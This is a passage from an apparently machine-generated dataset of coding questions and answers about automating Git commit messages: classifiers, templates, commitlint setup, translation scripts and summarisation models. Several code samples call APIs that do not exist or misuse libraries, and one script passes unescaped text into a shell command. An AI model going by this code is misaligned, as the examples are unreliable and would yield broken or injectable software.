unified route handling and error handling logic.\"\n\n```\nExample Code (in a script for automating merge commit generation):\n```javascript\nconst execSync = require('child_process').execSync;\n\nfunction generateMergeCommitMessage(featureBranch, changes, conflicts) {\n  const message = `\nMerge ${featureBranch}: ${changes}\n\n- ${changes}\n\nConflicts:\n${conflicts.map((conflict) => `- ${conflict}`).join('\\n')}\n\nIMPORTANT: Manual review and testing required due to extensive changes and conflicts.`;\n\n  const mergeCommand = `git merge ${featureBranch} -m \"${message}\"`;\n  execSync(mergeCommand, { stdio: 'inherit' });\n}\n\n// Example usage\nconst featureBranch = 'FeatureBranchXYZ';\nconst changes = 'Implement responsive UI and integrate new authentication flow';\nconst conflicts = [\n  'components/Header.js',\n  'services/auth.js',\n  'styles/global.css',\n  'routes/login.js',\n];\ngenerateMergeCommitMessage(featureBranch, changes, conflicts);\n```\nThese scripts demonstrate how to generate detailed commit messages for complex changes in a web development project. The messages provide context and necessary information for future developers, and the example code shows how these could be automated within a Git workflow."}, {"L2_TASK": "Commit text generation", "L3_TASK": "Automatic commit classification", "Complexity_Level": "medium", "Response": "Given that \"Commit text generation\" and \"Automatic commit classification\" don't directly map to the provided JSON, I'll interpret the problem in the context of software development, specifically using natural language processing (NLP) techniques to classify commit messages in a Git repository. These techniques fall under the broader category of \"Development\" and involve \"Data Science\" concepts, particularly \"Machine Learning\".\n\n**Question 1:**\nCreate a machine learning model that classifies Git commit messages into one of the following categories: \"Bug Fix\", \"Feature Addition\", \"Code Refactoring\", and \"Documentation Update\".\n\n**Solution:**\nWe can use a simple classification model like a Naive Bayes classifier for this task. First, we'll need to preprocess the commit messages, then train the model using a labeled dataset. Here's a Python code snippet using the `sklearn` library:\n\n```python\nimport pandas as pd\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.feature_extraction.text import CountVectorizer\nfrom sklearn.naive_bayes import MultinomialNB\nfrom sklearn.metrics import classification_report\n\n# Load and preprocess dataset\ndef preprocess_data(data):\n    # Apply techniques like lowercasing, removing punctuation, stopword removal, etc.\n    return data.lower().replace('[^\\w\\s]', '')\n\ndata = pd.read_csv('git_commits.csv')  # Assuming a CSV file with 'commit_message' and 'category' columns\ndata['processed_message'] = data['commit_message'].apply(preprocess_data)\n\n# Split dataset into training and testing sets\nX_train, X_test, y_train, y_test = train_test_split(data['processed_message'], data['category'], test_size=0.2, random_state=42)\n\n# Vectorize commit messages\nvectorizer = CountVectorizer()\nX_train_vec = vectorizer.fit_transform(X_train)\nX_test_vec = vectorizer.transform(X_test)\n\n# Train a Naive Bayes classifier\nclassifier = MultinomialNB()\nclassifier.fit(X_train_vec, y_train)\n\n# Test the model\ny_pred = classifier.predict(X_test_vec)\nprint(classification_report(y_test, y_pred))\n```\n\n**Question 2:**\nImplement a function that takes a Git commit message and returns the predicted category based on the trained model from Question 1.\n\n**Solution:**\nHere's a Python function to predict the category of a new commit message using the trained model:\n\n```python\ndef predict_commit_category(commit_message, trained_classifier, vectorizer):\n    # Preprocess the new commit message\n    processed_message = preprocess_data(commit_message)\n    \n    # Vectorize the new commit message\n    new_commit_vec = vectorizer.transform([processed_message])\n    \n    # Predict the category\n    predicted_category = trained_classifier.predict(new_commit_vec)[0]\n    \n    return predicted_category\n\n# Assuming `classifier` and `vectorizer` are the trained model and vectorizer from Question 1\nnew_message = \"Fixed a bug in the calculation function\"\npredicted_category = predict_commit_category(new_message, classifier, vectorizer)\nprint(f\"Predicted category: {predicted_category}\")\n```\n\n**Concept:**\nMachine Learning, Natural Language Processing, Text Classification, Naive Bayes Classifier, Feature Extraction"}, {"L2_TASK": "Commit text generation", "L3_TASK": "Automatic commit classification", "Complexity_Level": "extremely difficult", "Response": "Concept: Natural Language Processing (NLP)\n\nQuestion 1: Developing an advanced commit message generator that not only categorizes commit messages into standard types (e.g., bug fix, feature addition, code refactoring) but also generates semantically coherent and contextually relevant commit messages.\n\nProblem: Design a deep learning model that uses transformers (e.g., BERT) to classify commit messages into multiple categories and generate coherent commit messages based on the code changes. The model must be fine-tuned to understand code context and maintain consistency with the project's coding style.\n\nSolution:\n```python\nimport torch\nfrom transformers import BertTokenizer, BertForSequenceClassification, BertForMaskedLM\nfrom torch.utils.data import Dataset, DataLoader\nimport pandas as pd\nfrom sklearn.model_selection import train_test_split\n\nclass CommitDataset(Dataset):\n    def __init__(self, commit_texts, labels, tokenizer, max_len):\n        self.commit_texts = commit_texts\n        self.labels = labels\n        self.tokenizer = tokenizer\n        self.max_len = max_len\n\n    def __len__(self):\n        return len(self.commit_texts)\n\n    def __getitem__(self, idx):\n        commit_text = str(self.commit_texts[idx])\n        label = self.labels[idx]\n\n        encoding = self.tokenizer.encode_plus(\n            commit_text,\n            add_special_tokens=True,\n            max_length=self.max_len,\n            return_token_type_ids=False,\n            padding='max_length',\n            truncation=True,\n            return_attention_mask=True,\n            return_tensors='pt',\n        )\n\n        return {\n            'commit_text': commit_text,\n            'input_ids': encoding['input_ids'].flatten(),\n            'attention_mask': encoding['attention_mask'].flatten(),\n            'label': torch.tensor(label, dtype=torch.long)\n        }\n\n# Load and preprocess data\ndata = pd.read_csv('commit_data.csv')\ntrain_data, val_data = train_test_split(data, test_size=0.2, random_state=42)\n\ntokenizer = BertTokenizer.from_pretrained('bert-base-uncased')\nclassifier = BertForSequenceClassification.from_pretrained('bert-base-uncased', num_labels=len(categories))\ngenerator = BertForMaskedLM.from_pretrained('bert-base-uncased')\n\ntrain_dataset = CommitDataset(train_data['commit_text'], train_data['category'], tokenizer, max_len=128)\nval_dataset = CommitDataset(val_data['commit_text'], val_data['category'], tokenizer, max_len=128)\n\n# Train classifier model\n# (Code for training the classifier using optimizer, scheduler, and loss function)\n\n# Generate commit message for a new code change\ndef generate_commit_message(code_diff):\n    # Preprocess code_diff to get tokens\n    # (Code to tokenize the code_diff and mask relevant tokens for generation)\n    \n    masked_input_ids = tokenizer.encode(code_diff, return_tensors='pt', max_length=128, padding='max_length', truncation=True)\n    masked_tokens = torch.where(masked_input_ids == tokenizer.mask_token_id)[1]\n\n    generated_sequence = generator.generate(masked_input_ids, max_length=50, num_beams=4, early_stopping=True)\n    commit_message = tokenizer.decode(generated_sequence[0], skip_special_tokens=True)\n\n    return commit_message\n\n# Example usage\ncode_diff = \"Modified function XYZ to improve performance\"\ngenerated_message = generate_commit_message(code_diff)\nprint(generated_message)\n```\nNote: This is a simplified example, and in reality, you would need a large dataset of commit messages and code changes to fine-tune BERT effectively. Additionally, preprocessing the code changes to create meaningful input for the generator would require additional logic."}, {"L2_TASK": "Commit text generation", "L3_TASK": "Semantic commit messaging", "Complexity_Level": "medium", "Response": "\"Commit text generation\" and \"Semantic commit messaging\" are not directly mentioned in the provided JSON. However, they are related to version control systems and software development practices. I'll create a problem based on these concepts and provide a solution using a common tool for managing Git commits, such as the `commitlint` CLI tool.\n\nProblem:\nAs a senior developer, you need to enforce a consistent and semantic commit message format for your team's Git repository. The format should follow the Angular commit message conventions: `<type>(<scope>): <subject>`. The `type` can be `feat`, `fix`, `docs`, `style`, `refactor`, `perf`, `test`, or `chore`, and the `scope` describes the impacted area. Create a medium-complexity script using `commitlint` and a custom configuration to validate commit messages.\n\nSolution:\nFirst, let's install the `commitlint` and `@commitlint/config-angular` packages:\n\n```bash\nnpm install --save-dev @commitlint/{config-commitlint,commitlint}\nnpm install --save-dev @commitlint/config-angular\n```\n\nNext, create a `.commitlintrc.js` file in your root directory with the following configuration:\n\n```javascript\nmodule.exports = {\n  extends: ['@commitlint/config-angular'],\n};\n```\n\nThis configuration extends the Angular commit message conventions.\n\nNow, create a script in your `package.json` to validate commit messages:\n\n```json\n{\n  \"scripts\": {\n    \"commitlint\": \"commitlint --edit $(git rev-parse --short HEAD)\"\n  }\n}\n```\n\nThis script will run `commitlint` on the last commit's message.\n\nTo test the setup, create a commit with an incorrect message:\n\n```bash\ngit add .\ngit commit -m \"Incorrect commit message\"\n```\n\nNow run the validation script:\n\n```bash\nnpm run commitlint\n```\n\nThe script will return an error because the commit message doesn't follow the Angular convention.\n\nTo fix the error, amend the commit message to comply with the conventions:\n\n```bash\ngit commit --amend -m \"feat(scope): Add new feature to the impacted area\"\n```\n\nThen, run the validation script again:\n\n```bash\nnpm run commitlint\n```\n\nThis time, the script should not return any errors, indicating that the commit message is now properly formatted according to the Angular commit message conventions.\n\nConcept: Git Commit Management and Semantic Commit Messages"}, {"L2_TASK": "Commit text generation", "L3_TASK": "Semantic commit messaging", "Complexity_Level": "extremely difficult", "Response": "Area: \"Version Control Systems\"\nSub Area: \"Semantic Commit Messaging\"\n\nConcept: \"Semantic Commit Messages\"\n\nProblem 1: A software development team requires an automated system that generates semantic commit messages based on code changes. The system should analyze the code additions, deletions, and modifications to understand the functional impact and generate a commit message accordingly. The system should support multiple programming languages and adhere to the Angular commit message guidelines.\n\nSolution 1:\nTo create this system, you can use a combination of natural language processing (NLP) techniques, code analysis, and a library like `gitpython` to interact with Git repositories. Here's a Python example using `spacy` for NLP and `gitpython` for Git operations:\n\n```python\nimport spacy\nfrom git import Repo\n\n# Load a pre-trained NLP model, e.g., spaCy's en_core_web_sm\nnlp = spacy.load(\"en_core_web_sm\")\n\ndef analyze_code_changes(repo_path):\n    repo = Repo(repo_path)\n    changes = repo.index.diff(\"HEAD\")\n\n    commit_type = \"\"\n    commit_scope = \"\"\n    commit_summary = \"\"\n\n    for change in changes:\n        language = identify_language(change.a_path)  # Implement language identification\n        if language == \"JavaScript\":\n            # Analyze JavaScript code changes using language-specific rules\n            commit_type, commit_scope, commit_summary = analyze_js_change(change)\n        elif language == \"Python\":\n            # Analyze Python code changes using language-specific rules\n            commit_type, commit_scope, commit_summary = analyze_py_change(change)\n        # Add more languages as needed\n\n    return f\"{commit_type}({commit_scope}): {commit_summary}\"\n\ndef identify_language(file_path):\n    # Implement a function to identify the programming language from file path or file content\n    pass\n\ndef analyze_js_change(change):\n    # Analyze JavaScript code changes, extract relevant information\n    pass\n\ndef analyze_py_change(change):\n    # Analyze Python code changes, extract relevant information\n    pass\n\n# Example usage\nrepo_path = \"/path/to/your/repo\"\ncommit_message = analyze_code_changes(repo_path)\nprint(commit_message)\n```\nThis example outlines a high-level structure for the solution, but you'll need to implement the detailed logic for analyzing code changes (e.g., `analyze_js_change` and `analyze_py_change`), identifying languages, and adhering to Angular's commit message guidelines.\n\nProblem 2: Given a large codebase and a set of semantic commit messages, develop an AI model that can predict the appropriate semantic commit message for future code changes. The model should continuously learn from new commits and improve its accuracy over time.\n\nSolution 2:\nTo create an AI model for predicting semantic commit messages, you can use a combination of pre-trained transformers and reinforcement learning. Start by preprocessing the commit messages and code changes, then use the pre-trained transformer as a feature extractor. Train a reinforcement learning agent, such as a Proximal Policy Optimization (PPO) algorithm, to learn the mapping between code changes and commit messages.\n\nHere's a Python example using `transformers` for the pre-trained transformer and `stable-baselines3` for the PPO algorithm:\n\n```python\nimport torch\nfrom transformers import AutoTokenizer, AutoModel\nfrom stable_baselines3 import PPO\nfrom code_analysis import analyze_code_change  # Custom code analysis function\n\ntokenizer = AutoTokenizer.from_pretrained(\"bert-base-uncased\")\nmodel = AutoModel.from_pretrained(\"bert-base-uncased\")\n\ndef encode_code_change(code_change):\n    # Encode code change using the pre-trained transformer\n    encoded_change = tokenizer(code_change, return_tensors=\"pt\")\n    return encoded_change[\"input_ids\"], encoded_change[\"attention_mask\"]\n\ndef predict_commit_message(code_change):\n    input_ids, attention_mask = encode_code_change(code_change)\n    _, pooled_output = model(input_ids, attention_mask=attention_mask)\n    # Use pooled_output as features for the reinforcement learning model\n\n# Initialize the PPO model and train it with your dataset\nppo_model = PPO(\"MlpPolicy\", \"CartPole-v1\")\n# Load or train your dataset here\n\n# Continuously learn from new commits\ndef learn_from_new_commit(new_commit):\n    code_change, commit_message = analyze_code_change(new_commit)\n    ppo_model.learn_from_example(code_change, commit_message)\n\n# Example usage\nnew_commit = analyze_code_changes(\"/path/to/new/commit\")\nlearn_from_new_commit(new_commit)\n```\nThis example assumes you have a custom `analyze_code_change` function that extracts code changes and commit messages from the repository. You'll need to implement this function, as well as the data preprocessing, dataset loading, and reinforcement learning training details."}, {"L2_TASK": "Commit text generation", "L3_TASK": "Commit message templates", "Complexity_Level": "medium", "Response": "The topic \"Commit text generation\" and sub area \"Commit message templates\" are not directly found in the provided domain JSON. However, they are related to version control systems and software development practices. I will create a relevant problem and solution based on these concepts.\n\nProblem: A software development team wants a consistent and informative commit message structure to improve code review and maintainability. They require a medium complexity script that generates commit messages using a template with the following format: \"ACTION: DESCRIPTION [CONTRIBUTOR]\". ACTION can be 'Add', 'Fix', 'Refactor', etc., DESCRIPTION is a short summary of changes, and CONTRIBUTOR is the developer's name.\n\nSolution:\n```python\ndef generate_commit_message(action, description, contributor):\n    template = f\"{action}: {description} [{contributor}]\"\n    return template\n\n# Sample usage\naction = \"Refactor\"\ndescription = \"Optimize database query efficiency\"\ncontributor = \"John Doe\"\n\ncommit_message = generate_commit_message(action, description, contributor)\nprint(commit_message)\n```\nConcept: \"Version Control\"\n\nIn this script, we have created a simple function `generate_commit_message` that takes an ACTION, DESCRIPTION, and CONTRIBUTOR as input parameters and returns a formatted commit message string following the given template. This helps maintain consistency in commit messages across the team."}, {"L2_TASK": "Commit text generation", "L3_TASK": "Commit message templates", "Complexity_Level": "extremely difficult", "Response": "The given JSON does not directly cover \"Commit text generation\" or \"Commit message templates\" as a specific domain or subcategory. However, I can create a problem related to these concepts, which involves using programming language concepts like text processing, natural language generation, and version control.\n\n**Concept: Natural Language Processing (NLP)**\n\n**Problem:**\nDevelop a complex system that automatically generates meaningful commit messages for a Git repository by analyzing the changes made in each commit. The system should use NLP techniques to summarize the changes and adhere to a customizable set of commit message templates. The generated messages should be informative, concise, and follow the conventional commit message structure (e.g., \"type(scope): message\").\n\n**Solution:**\n\n1. Analyze the changes: Use Git's Python API (`gitpython`) to fetch the changes in a commit. Identify the modified files, additions, deletions, and relevant code blocks.\n```python\nfrom git import Repo\n\nrepo = Repo(\"<path_to_repo>\")\ncommit = repo.commit(\"<commit_hash>\")\nmodified_files = [c for c in commit.stats.files if c[1] != 0]\n```\n1. Text processing: Preprocess the code changes by tokenizing, stemming, and removing stop words. Use libraries like `nltk` and `spacy`.\n```python\nimport nltk\nimport spacy\n\nnltk.download('punkt')\nnltk.download('stopwords')\nnlp = spacy.load('en_core_web_sm')\n\ndef preprocess_code(code):\n    tokens = nltk.word_tokenize(code)\n    stop_words = set(nltk.corpus.stopwords.words('english'))\n    tokens = [token for token in tokens if token.lower() not in stop_words]\n    stemmed_tokens = [nlp(token).stem for token in tokens if token.isalpha()]\n    return ' '.join(stemmed_tokens)\n```\n1. Summarize changes: Use an NLP-based summarization technique like TextRank to generate a summary of the changes.\n```python\nfrom transformers import pipeline\n\nsummarizer = pipeline('summarization')\ndef summarize_changes(changes):\n    summary = summarizer('\\n'.join(changes))[0]['summary_text']\n    return summary\n```\n1. Match template: Define a set of commit message templates and use NLP to find the most suitable template based on the summary's context.\n```python\ntemplates = [\n    ('type: {summary}', '_bug'),\n    ('refactor({scope}): {summary}', 'refactor'),\n    ('docs({scope}): {summary}', 'docs'),\n    ('style({scope}): {summary}', 'style'),\n    # Add more templates...\n]\n\ndef select_template(summary):\n    for template, type in templates:\n        if nlp(summary).vector @ nlp(template).vector > 0.8:\n            return type, template\n    return 'other', 'other: {summary}'\n```\n1. Generate the commit message: Combine the selected template with the summary.\n```python\ndef generate_commit_message(summary):\n    type, template = select_template(summary)\n    message = template.format(scope='', summary=summary)\n    return message\n\nsummary = summarize_changes([preprocess_code(file) for file in modified_files])\ncommit_message = generate_commit_message(summary)\nprint(commit_message)\n```\nThis solution combines various NLP techniques and tools to generate commit messages, which can be further refined to improve accuracy and match specific project requirements. Note that the code is a simplified example and may require adjustments for real-world use cases."}, {"L2_TASK": "Commit text generation", "L3_TASK": "Version control integration for commit messages", "Complexity_Level": "medium", "Response": "The given problem domain doesn't directly map to any of the concepts listed in the provided JSON. However, we can interpret the problem as involving text generation and version control, which can be related to the \"Programming Language Concepts\" and \"Development\" categories. For this scenario, we will focus on using a Git hook to automatically generate commit messages based on specific patterns.\n\nQuestion 1:\nProblem: Write a script using a suitable language (e.g., Python) that integrates with Git to automatically generate commit messages based on the modified file types. If the modified files are `.py` (Python), the commit message should start with \"Python:\", followed by the number of modified Python files. If modified files are `.js` (JavaScript), the commit message should start with \"JavaScript:\", followed by the number of modified JavaScript files. If both file types are modified, separate the counts with a comma.\n\nSolution:\n```python\nimport os\nimport sys\nfrom collections import defaultdict\n\ndef generate_commit_message(added_files, modified_files, deleted_files):\n    file_counts = defaultdict(int)\n    \n    for file_path in added_files + modified_files + deleted_files:\n        extension = os.path.splitext(file_path)[1].lower()\n        if extension == \".py\":\n            file_counts[\"Python\"] += 1\n        elif extension == \".js\":\n            file_counts[\"JavaScript\"] += 1\n            \n    message = \"\"\n    for lang, count in file_counts.items():\n        if count > 0:\n            if message:\n                message += \", \"\n            message += f\"{lang}:{count}\"\n            \n    return message\n\nif __name__ == \"__main__\":\n    # Simulate Git hook input\n    added_files = [\"script.py\", \"index.js\"]\n    modified_files = [\"lib/utils.py\", \"styles.css\"]\n    deleted_files = []\n\n    commit_message = generate_commit_message(added_files, modified_files, deleted_files)\n    print(commit_message)  # Output: Python:2, JavaScript:1\n```\nIn this solution, we define a `generate_commit_message` function that takes lists of added, modified, and deleted files and returns a commit message based on the modified file types. The script can be used as a `pre-commit` Git hook to automatically generate commit messages before committing.\n\nQuestion 2:\nProblem: Create a Node.js script that integrates with a Git repository to generate commit messages based on the total lines of code (LOC) modifications. If the total LOC added in `.py` files is greater than the total LOC removed, the commit message should start with \"+Python:\". Otherwise, it should start with \"-Python:\". Similarly, for `.js` files, if the total LOC added is greater, use \"+JavaScript:\", else use \"-JavaScript:\". If both file types are modified, separate the signs with a comma.\n\nSolution:\n```javascript\nconst fs = require('fs');\nconst path = require('path');\nconst shell = require('shelljs');\n\nfunction countLOC(filePath, extension) {\n  const contents = fs.readFileSync(filePath, 'utf-8');\n  const lines = contents.split(/\\r?\\n/);\n  const totalLOC = lines.length;\n\n  if (extension === '.py') {\n    return lines.filter(line => !line.startsWith('#')).length;\n  }\n\n  return totalLOC;\n}\n\nfunction generateCommitMessage(addedFiles, modifiedFiles) {\n  let pythonLocDiff = 0;\n  let jsLocDiff = 0;\n\n  addedFiles.forEach(file => {\n    const extension = path.extname(file);\n    if (extension === '.py') {\n      pythonLocDiff += countLOC(file, extension);\n    } else if (extension === '.js') {\n      jsLocDiff += countLOC(file, extension);\n    }\n  });\n\n  modifiedFiles.forEach(file => {\n    const extension = path.extname(file);\n    if (extension === '.py') {\n      pythonLocDiff += countLOC(file, extension) - countLOC(file.replace('.py', '-py-old'), '.py');\n    } else if (extension === '.js') {\n      jsLocDiff += countLOC(file, extension) - countLOC(file.replace('.js', '-js-old'), '.js');\n    }\n  });\n\n  return `${pythonLocDiff > 0 ? '+Python:' : '-Python:'}${pythonLocDiff > 0 ? ',' : ''}${jsLocDiff > 0 ? '+JavaScript:' : '-JavaScript:'}`;\n}\n\nif (require.main === module) {\n  const gitDiff = shell.exec('git diff --cached --name-only --diff-filter=AM', { silent: true }).stdout.split('\\n');\n  const addedFiles = gitDiff.filter(file => file.startsWith('+'));\n  const modifiedFiles = gitDiff.filter(file => !file.startsWith('+') && !file.startsWith('-'));\n\n  const commitMessage = generateCommitMessage(addedFiles, modifiedFiles);\n  console.log(commitMessage);\n}\n```\nIn this solution, we use Node.js to read and count the lines of code in modified and added files. The `generateCommitMessage` function calculates the differences in LOC for `.py` and `.js` files and generates the appropriate commit message. The script can be used as a Git hook to generate commit messages before committing.\n\nNote: For both solutions, you would need to place the script in the `.git/hooks/pre-commit` directory of your Git repository and make it executable (`chmod +x .git/hooks/pre-commit`)."}, {"L2_TASK": "Commit text generation", "L3_TASK": "Version control integration for commit messages", "Complexity_Level": "extremely difficult", "Response": "The given JSON does not contain a specific category or subcategory for \"Commit text generation\" or \"Version control integration for commit messages.\" However, these concepts fall under the broader domain of \"Version Control Systems,\" typically associated with tools like Git. Here, I'll create a problem and solution related to Git commit message automation and integration.\n\nProblem: Develop a complex, extensible, and language-agnostic Git commit message generator that integrates with a project's build system, analyzes code changes, and suggests semantically appropriate commit messages based on a predefined set of rules and a machine learning model.\n\nSolution: We can create a Python script that utilizes the GitPython library to interact with Git, and the SpaCy library for natural language processing to analyze code changes. The script will generate commit messages based on the type of changes detected in the code and a trained machine learning model.\n\n```python\nimport os\nimport re\nimport subprocess\nfrom typing import List, Tuple\nfrom git import Repo\nimport spacy\nfrom sklearn.feature_extraction.text import TfidfVectorizer\nfrom sklearn.naive_bayes import MultinomialNB\n\n# Load the trained machine learning model\nnlp = spacy.load(\"en_core_web_sm\")\nmodel = MultinomialNB().load(\"commit_message_model.joblib\")\n\n# Predefined commit message categories\ncategories = [\"ADD\", \"FIX\", \"REFactor\", \"DOC\", \"TEST\"]\n\ndef analyze_code_changes(file_diffs: List[str]) -> List[Tuple[str, float]]:\n    category_scores = []\n    for diff in file_diffs:\n        doc = nlp(diff)\n        vectors = [token.vector for token in doc if token.is_alpha]\n        if vectors:\n            category_score = model.predict_proba([vectors])[0]\n            category_scores.append((categories, category_score))\n    return category_scores\n\ndef generate_commit_message(files_to_commit: List[str]) -> str:\n    repo = Repo(os.getcwd())\n    file_diffs = [subprocess.check_output([\"git\", \"diff\", \"--staged\", f]).decode(\"utf-8\") for f in files_to_commit]\n\n    category_scores = analyze_code_changes(file_diffs)\n    max_score_category = max(category_scores, key=lambda x: x[1])[0]\n    max_score = max(category_scores, key=lambda x: x[1])[1][max_score_category]\n\n    message = f\"{max_score_category}: \" + \"; \".join([f for f in files_to_commit if len(f) > 0])\n    return message\n\n# Integrate with build system (e.g., using a pre-commit hook)\nfiles_to_commit = subprocess.check_output([\"git\", \"diff\", \"--cached\", \"--name-only\"]).decode(\"utf-8\").splitlines()\ncommit_message = generate_commit_message(files_to_commit)\nprint(f\"Generated commit message: {commit_message}\")\n```\n\nThis solution creates a Python script that integrates with Git to fetch file changes, uses SpaCy for text analysis, and applies a machine learning model to generate a commit message based on the detected changes. This script can be further extended to include more complex rules and improve the machine learning model for better accuracy.\n\n**Concept: Version Control** (referring to Git in this context)"}, {"L2_TASK": "Commit text generation", "L3_TASK": "Multi-language commit support", "Complexity_Level": "medium", "Response": "The given JSON doesn't directly include a domain specific to \"Commit text generation\" or \"Multi-language commit support\". However, this concept is related to version control systems (VCS) like Git and how they handle commit messages across different languages. We can create a medium complexity problem involving a script that generates commit messages in multiple languages.\n\nProblem: You need to develop a script that takes a commit message in English and translates it into French and Spanish before generating a Git commit command for each language.\n\nConcept: \"Multi-language support\" (using a translation API)\n\n**Question 1:**\nCreate a Python script that uses the Google Translate API to translate a commit message into French and Spanish, then formats and outputs the corresponding Git commit commands for each language.\n\nSolution:\n\n1. First, you'll need to install the `googletrans` library, a wrapper for Google Translate's API. You can install it using pip:\n```bash\npip install googletrans==4.0.0-rc1\n```\n1. Now, create a Python script called `multi_lang_commit.py`:\n\n```python\nfrom googletrans import Translator\n\ndef translate_commit(message, target_languages):\n    translator = Translator()\n    translations = translator.translate(message, dest=target_languages)\n\n    git_commands = {}\n    for lang, translation in translations.items():\n        git_command = f'git commit -m \"{translation.text}\"'\n        git_commands[lang] = git_command\n    return git_commands\n\nenglish_message = \"Fix bug in user authentication\"\ntarget_languages = ['fr', 'es']\n\ngit_commands = translate_commit(english_message, target_languages)\nfor lang, command in git_commands.items():\n    print(f\"Git commit command for {lang}: {command}\")\n```\nThis script defines a function `translate_commit` that takes a commit message and a list of target languages. It uses the `googletrans` library to translate the message, then generates a Git commit command for each language. The example code will output:\n\n```\nGit commit command for fr: git commit -m \"Corriger un bug dans l'authentification utilisateur\"\nGit commit command for es: git commit -m \"Arregla un error en la autenticaci\u00f3n de usuario\"\n```\n\n**Question 2:**\nModify the previous Python script to save the translated commit messages and corresponding Git commands in a JSON file for later use.\n\nSolution:\n\n```python\nimport json\n\n# ... (same as before)\n\ndef save_translations_to_json(translations, filename):\n    git_commands = {}\n    for lang, translation in translations.items():\n        git_command = f'git commit -m \"{translation.text}\"'\n        git_commands[lang] = git_command\n\n    data = {'commit_messages': git_commands}\n    with open(filename, 'w') as json_file:\n        json.dump(data, json_file, ensure_ascii=False, indent=2)\n\nfilename = \"translated_commits.json\"\ngit_commands = translate_commit(english_message, target_languages)\nsave_translations_to_json(git_commands, filename)\n\nprint(\"Translated commit messages saved to:\", filename)\n```\nThis updated script adds a `save_translations_to_json` function to store the translations and Git commands in a JSON file. After running the script, you'll have a file called `translated_commits.json` with the translated commit messages and Git commands formatted in JSON."}, {"L2_TASK": "Commit text generation", "L3_TASK": "Multi-language commit support", "Complexity_Level": "extremely difficult", "Response": "The given JSON doesn't directly contain a \"Commit text generation\" or \"Multi-language commit support\" concept. However, I can create a problem related to version control systems and commit message generation, considering the context of programming languages and development.\n\nProblem: Develop a command-line tool that generates well-structured commit messages in multiple languages based on user input. The tool should support a variety of languages, handle different sentence structures, and maintain consistency in commit message formats.\n\nSolution:\nConcept: Natural Language Processing (NLP), Command-Line Interface (CLI), Multi-language Support\n\nHere's an example of a Python solution using the `nltk` library for NLP and `argparse` for CLI parsing:\n\n```python\nimport argparse\nimport nltk\nfrom nltk.tokenize import word_tokenize, sent_tokenize\nfrom nltk.corpus import stopwords\nfrom nltk.stem import WordNetLemmatizer\nfrom languages import language_rules  # A dictionary containing language-specific rules\n\n# Initialize lemmatizer\nlemmatizer = WordNetLemmatizer()\n\ndef generate_commit_message(text, language):\n    # Tokenize and clean text\n    tokens = word_tokenize(text)\n    tokens = [lemmatizer.lemmatize(token.lower()) for token in tokens if token.isalnum() and token.lower() not in stopwords.words(language)]\n\n    # Apply language-specific rules to construct commit message\n    if language in language_rules:\n        rule_function = language_rules[language]\n        commit_message = rule_function(tokens)\n    else:\n        raise ValueError(f\"Unsupported language: {language}\")\n    \n    return commit_message\n\ndef create_commit_message_cli():\n    parser = argparse.ArgumentParser(description=\"Generate commit messages in multiple languages.\")\n    parser.add_argument(\"-l\", \"--language\", required=True, choices=[\"en\", \"fr\", \"es\"], help=\"Language for the commit message\")\n    parser.add_argument(\"-t\", \"--text\", required=True, help=\"Commit message content\")\n    \n    args = parser.parse_args()\n\n    commit_message = generate_commit_message(args.text, args.language)\n    print(f\"Generated commit message: {commit_message}\")\n\nif __name__ == \"__main__\":\n    create_commit_message_cli()\n```\nIn this solution, the `languages.py` file would contain a dictionary `language_rules` with functions for each supported language (e.g., `en_rule`, `fr_rule`, `es_rule`). These functions would take the cleaned tokens and apply language-specific rules to construct the commit message.\n\nExample usage in command line:\n```bash\npython commit_generator.py -l en -t \"Fixed a bug in the user authentication module\"\n```\nThis would generate a well-structured English commit message based on the input text. The implementation of `en_rule`, `fr_rule`, and `es_rule` would be complex and require a deep understanding of the grammar and sentence structures of each language.\n\nPlease note that this problem is highly abstracted, and the actual implementation of NLP rules and sentence structures for different languages would be a significant challenge and would likely require a large amount of data and advanced NLP techniques."}, {"L2_TASK": "Commit text generation", "L3_TASK": "Commit summarization for changelogs", "Complexity_Level": "medium", "Response": "It seems there's a slight mismatch in your request. The provided JSON does not contain an area called \"Commit text generation\" or a subarea named \"Commit summarization for changelogs.\" However, I can create a problem related to Git and commit messages, which can be relevant to managing version control and creating changelogs.\n\nDomain: Version Control / Git\n\nConcept: Git Commit Summarization\n\nProblem:\nSuppose you are working on a project that has a large Git history, and you need to automatically generate concise commit summaries for a changelog. Write a script in Python that fetches the latest commits from a Git repository and summarizes their messages into a single line, considering only the first sentence of each commit message.\n\nSolution:\n\n```python\nimport subprocess\n\ndef fetch_commits(repo_path, limit=10):\n    command = f\"git --git-dir={repo_path}/.git log --pretty=format:'%s' -{limit}\"\n    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE)\n    commits = result.stdout.decode('utf-8').split('\\n')\n    return commits\n\ndef summarize_commits(commit_messages):\n    summaries = [msg.split('.')[0] for msg in commit_messages if msg]\n    return ', '.join(summaries)\n\n# Example usage\nrepo_path = \"./my_project\"\nlatest_commits = fetch_commits(repo_path, limit=5)\nchangelog_summary = summarize_commits(latest_commits)\n\nprint(f\"Changelog Summary:\\n{changelog_summary}\")\n```\n\nThis script does the following:\n1. `fetch_commits` function retrieves the latest `limit` commit messages from the given repository using the `git log` command. It returns a list of commit summaries.\n2. `summarize_commits` function takes the list of commit messages, splits each message by the first period (assuming the first sentence ends with a period), and returns a comma-separated string of the first sentences.\n3. In the example, the script is run with the `./my_project` directory as the repository path and fetches the 5 latest commits. The generated changelog summary is then printed.\n\nNote: Running this script requires Git to be installed and the script to be executed within the project's directory or with the correct path to the repository."}, {"L2_TASK": "Commit text generation", "L3_TASK": "Commit summarization for changelogs", "Complexity_Level": "extremely difficult", "Response": "Area: \"Commit text generation\" Sub Area: \"Commit summarization for changelogs\"\n\nQuestion 1: Develop an advanced AI model that automatically summarizes a series of Git commit messages into a concise and coherent changelog entry. The model should handle complex commit structures, merge commits, and detect semantically significant changes for inclusion in the summary.\n\n**Concept**: Natural Language Processing (NLP), Text Summarization\n\nSolution:\nTo tackle this problem, we can use a combination of natural language processing techniques and deep learning models. We'll leverage the Transformer architecture, specifically the BART (Bidirectional and Auto-Regressive Transformer) model, which is well-suited for text generation tasks like summarization.\n\nExample Python code using the Hugging Face Transformers library:\n\n```python\nimport torch\nfrom transformers import BartTokenizer, BartForConditionalGeneration\n\n# Load pre-trained BART model and tokenizer\nmodel_name = \"facebook/bart-large-cnn\"\ntokenizer = BartTokenizer.from_pretrained(model_name)\nmodel = BartForConditionalGeneration.from_pretrained(model_name)\n\n# Example commit messages\ncommit_messages = [\n    \"Fixed a bug in the calculation 